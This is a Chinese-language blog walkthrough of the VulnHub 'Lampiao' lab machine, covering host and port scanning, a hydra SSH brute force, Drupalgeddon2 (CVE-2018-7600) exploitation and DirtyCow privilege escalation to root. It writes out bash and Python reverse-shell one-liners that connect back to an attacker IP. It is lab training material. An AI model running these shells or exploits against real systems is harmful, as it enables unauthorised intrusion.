@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="forg12">
+    
+    <title>
+        
+            vulnhub-lampiao |
+        
+        forg12&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"forg1222.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"https://forg1222.github.io/images/head.jpeg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"https://forg1222.github.io/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"6.6.6"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                forg12&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">vulnhub-lampiao</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="https://forg1222.github.io/images/head.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">forg12</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-08-02 18:53:28</span>
+        <span class="mobile">2022-08-02 18:53</span>
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/vulnhub/">vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.2k 字</span>
+        </span>
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ol>
+<li>Getshell<ol>
+<li>信息收集 —&gt; ssh爆破</li>
+<li>cve-2018-7600<ol>
+<li>exp</li>
+<li>msf</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>dirtyC0w2提权</li>
+</ol>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>目标靶机的IP地址为102。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.1.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.0029s latency).</span><br><span class="line">Nmap scan report for 192.168.1.102</span><br><span class="line">Host is up (0.011s latency).</span><br><span class="line">Nmap scan report for 192.168.1.104</span><br><span class="line">Host is up (0.0016s latency).</span><br><span class="line">Nmap scan report for 192.168.1.108</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 5.11 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.1.102</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.1.102</span><br><span class="line">Host is up (0.017s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">1898/tcp open  cymtec-port</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>80端口展示没有可用信息。</p>
+<img src="/2022/08/02/vulnhub-lampiao/image-20220807191234218.png" alt="image-20220807191234218" style="zoom:25%;">
+
+<img src="/2022/08/02/vulnhub-lampiao/image-20220807191153958.png" alt="image-20220807191153958" style="zoom:25%;">
+
+<h2 id="1898端口"><a href="#1898端口" class="headerlink" title="1898端口"></a>1898端口</h2><img src="/2022/08/02/vulnhub-lampiao/image-20220807205142438.png" alt="image-20220807205142438" style="zoom:25%;">
+
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.102:1898/ -x 403                                 </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2                                                                                           </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                    </span><br><span class="line">                                                                                                                           </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Target: http://192.168.1.102:1898/</span><br><span class="line"></span><br><span class="line">[19:24:42] Starting: </span><br><span class="line">[19:24:44] 200 -    1KB - /COPYRIGHT.txt                                    </span><br><span class="line">[19:24:44] 200 -  108KB - /CHANGELOG.txt                                    </span><br><span class="line">[19:24:44] 200 -    2KB - /INSTALL.mysql.txt                                </span><br><span class="line">[19:24:44] 200 -    2KB - /INSTALL.pgsql.txt</span><br><span class="line">[19:24:44] 200 -    9KB - /MAINTAINERS.txt                                  </span><br><span class="line">[19:24:44] 200 -   18KB - /INSTALL.txt                                      </span><br><span class="line">[19:24:44] 200 -   18KB - /LICENSE.txt                                      </span><br><span class="line">[19:24:44] 200 -    5KB - /README.txt                                       </span><br><span class="line">[19:24:45] 200 -   10KB - /UPGRADE.txt                                      </span><br><span class="line">[19:24:51] 301 -  323B  - /includes  -&gt;  http://192.168.1.102:1898/includes/</span><br><span class="line">[19:24:51] 200 -   10KB - /includes/                                        </span><br><span class="line">[19:24:51] 200 -    3KB - /install.php                                      </span><br><span class="line">[19:24:51] 200 -   11KB - /index.php                                        </span><br><span class="line">[19:24:52] 200 -  132KB - /includes/bootstrap.inc                           </span><br><span class="line">[19:24:53] 301 -  319B  - /misc  -&gt;  http://192.168.1.102:1898/misc/        </span><br><span class="line">[19:24:54] 301 -  322B  - /modules  -&gt;  http://192.168.1.102:1898/modules/  </span><br><span class="line">[19:24:54] 200 -    9KB - /modules/                                         </span><br><span class="line">[19:24:55] 301 -  323B  - /profiles  -&gt;  http://192.168.1.102:1898/profiles/</span><br><span class="line">[19:24:55] 200 -  271B  - /profiles/minimal/minimal.info</span><br><span class="line">[19:24:55] 200 -  278B  - /profiles/testing/testing.info</span><br><span class="line">[19:24:55] 200 -  743B  - /profiles/standard/standard.info                  </span><br><span class="line">[19:24:56] 200 -    2KB - /robots.txt                                       </span><br><span class="line">[19:24:56] 200 -    3KB - /scripts/                                         </span><br><span class="line">[19:24:56] 301 -  322B  - /scripts  -&gt;  http://192.168.1.102:1898/scripts/</span><br><span class="line">[19:24:57] 200 -  904B  - /sites/README.txt                                 </span><br><span class="line">[19:24:57] 301 -  320B  - /sites  -&gt;  http://192.168.1.102:1898/sites/      </span><br><span class="line">[19:24:57] 200 - 1020B  - /sites/all/themes/README.txt</span><br><span class="line">[19:24:57] 200 -  151B  - /sites/all/libraries/README.txt                   </span><br><span class="line">[19:24:57] 200 -    1KB - /sites/all/modules/README.txt                     </span><br><span class="line">[19:24:57] 200 -    0B  - /sites/example.sites.php                          </span><br><span class="line">[19:24:58] 301 -  321B  - /themes  -&gt;  http://192.168.1.102:1898/themes/    </span><br><span class="line">[19:24:58] 200 -    2KB - /themes/</span><br><span class="line">[19:24:59] 200 -    2KB - /web.config</span><br><span class="line">[19:24:59] 200 -   42B  - /xmlrpc.php                       </span><br></pre></td></tr></table></figure>
+
+<img src="/2022/08/02/vulnhub-lampiao/image-20220807194127391.png" alt="image-20220807194127391" style="zoom:25%;">
+
+<p>​	cms版本为<code>Drupal 7.54</code></p>
+<h3 id="node-x2F-2"><a href="#node-x2F-2" class="headerlink" title="node&#x2F;2"></a>node&#x2F;2</h3><p>​	打开网站后，发现有两个文章，第一个好像是故事介绍。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lampião，Sertão 的英雄还是恶棍？</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/02/vulnhub-lampiao/image-20220807205703383.png" alt="image-20220807205703383"></p>
+<p><img src="/2022/08/02/vulnhub-lampiao/image-20220807205808670.png" alt="image-20220807205808670"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">只是测试..</span><br><span class="line">LuizGonzaga-LampiaoFalou.mp3</span><br><span class="line"></span><br><span class="line">node 2 不工作:(</span><br></pre></td></tr></table></figure>
+
+<p>​	这篇文章中显示的mp3为正常的音乐，然后这里提到了node2不工作，根据访问的规律，访问<code>?q=node/2</code></p>
+<p><img src="/2022/08/02/vulnhub-lampiao/image-20220807210134555.png" alt="image-20220807210134555"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102:1898/audio.m4a # 音频为：user tiago</span><br><span class="line">http://192.168.1.102:1898/qrc.png # 为二维码，扫码结果为：Try harder! muahuahua</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/02/vulnhub-lampiao/image-20220807211110322.png" alt="image-20220807211110322"></p>
+<p><img src="/2022/08/02/vulnhub-lampiao/image-20220807210547955.png" alt="image-20220807210547955"></p>
+<h2 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h2><p>​	根据语音的提示，用户名为tiago，然后选择通过第一篇文章生成密码字典，然后对ssh服务进行爆破。</p>
+<h3 id="cewl生成密码字典"><a href="#cewl生成密码字典" class="headerlink" title="cewl生成密码字典"></a>cewl生成密码字典</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.1.102:1898/?q=node/1 -w pwd.txt</span><br><span class="line">CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br></pre></td></tr></table></figure>
+
+<h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hydra -l tiago -P pwd.txt ssh://192.168.1.102:22 </span><br><span class="line"></span><br><span class="line">[DATA] attacking ssh://192.168.1.102:22/</span><br><span class="line">[22][ssh] host: 192.168.1.102   login: tiago   password: Virgulino</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="漏洞利用-CVE-2018-7600"><a href="#漏洞利用-CVE-2018-7600" class="headerlink" title="漏洞利用-CVE-2018-7600"></a>漏洞利用-CVE-2018-7600</h1><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><p>​	<a class="link" target="_blank" rel="noopener" href="https://github.com/pimps/CVE-2018-7600">https://github.com/pimps/CVE-2018-7600<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="/2022/08/02/vulnhub-lampiao/image-20220807221819963.png" alt="image-20220807221819963"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/192.168.1.107/6666 0&lt;&amp; 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.107/6666 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.107&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ruby脚本"><a href="#ruby脚本" class="headerlink" title="ruby脚本"></a>ruby脚本</h3><p><a class="link" target="_blank" rel="noopener" href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2<i class="fas fa-external-link-alt"></i></a></p>
+<p>​	环境配置：使用报错，提示不能加载<code>highline</code>，gem安装highline。</p>
+<p><img src="/2022/08/02/vulnhub-lampiao/image-20220807224129016.png" alt="image-20220807224129016"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install highline</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/02/vulnhub-lampiao/image-20220807224323143.png" alt="image-20220807224323143"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./drupalgeddon2.rb http://192.168.1.102:1898/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/02/vulnhub-lampiao/image-20220807224358481.png" alt="image-20220807224358481"></p>
+<p>​	</p>
+<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">set rhosts 192.168.1.102</span><br><span class="line">set rport 1898</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>​	无论是通过信息收集，生成字典，还是直接通过识别cms找到对于版本的漏洞，都可以拿到靶场的低权限。然后利用lipneas.sh查看可以使用哪些提权。</p>
+<h2 id="linpeas-sh"><a href="#linpeas-sh" class="headerlink" title="linpeas.sh"></a>linpeas.sh</h2><p>​	使用linpeas.sh收集可以利用的cve。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[+] [CVE-2016-5195] dirtycow</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,[ ubuntu=16.04|14.04|12.04 ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40611</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-5195] dirtycow 2</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40839</span><br><span class="line">   ext-url: https://www.exploit-db.com/download/40847</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="dirtycow2"><a href="#dirtycow2" class="headerlink" title="dirtycow2"></a>dirtycow2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow exp.cpp -lutil</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/02/vulnhub-lampiao/image-20220808101601860.png" alt="image-20220808101601860"></p>
+<h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.1.102 # 密码为 dirtyCowFun</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/02/vulnhub-lampiao/image-20220808101753869.png" alt="image-20220808101753869"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@lampiao:~# cat flag.txt </span><br><span class="line">9740616875908d91ddcdaa8aea3af366</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/vulnhub/">#vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/08/03/vulnhub-raven2/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">vulnhub-raven2</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/08/01/vulnhub-goldeneye/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">vulnhub_goldeneye</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">forg12</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v6.6.6</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">2.1.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="nav-number">2.3.</span> <span class="nav-text">80端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1898%E7%AB%AF%E5%8F%A3"><span class="nav-number">2.4.</span> <span class="nav-text">1898端口</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">2.4.1.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#node-x2F-2"><span class="nav-number">2.4.2.</span> <span class="nav-text">node&#x2F;2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh%E7%88%86%E7%A0%B4"><span class="nav-number">2.5.</span> <span class="nav-text">ssh爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cewl%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8"><span class="nav-number">2.5.1.</span> <span class="nav-text">cewl生成密码字典</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hydra%E7%88%86%E7%A0%B4"><span class="nav-number">2.5.2.</span> <span class="nav-text">hydra爆破</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2018-7600"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用-CVE-2018-7600</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">3.1.</span> <span class="nav-text">exp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#python%E8%84%9A%E6%9C%AC"><span class="nav-number">3.1.1.</span> <span class="nav-text">python脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ruby%E8%84%9A%E6%9C%AC"><span class="nav-number">3.1.2.</span> <span class="nav-text">ruby脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf"><span class="nav-number">3.2.</span> <span class="nav-text">msf</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#linpeas-sh"><span class="nav-number">4.1.</span> <span class="nav-text">linpeas.sh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dirtycow2"><span class="nav-number">4.2.</span> <span class="nav-text">dirtycow2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cat-flag"><span class="nav-number">4.3.</span> <span class="nav-text">cat flag</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
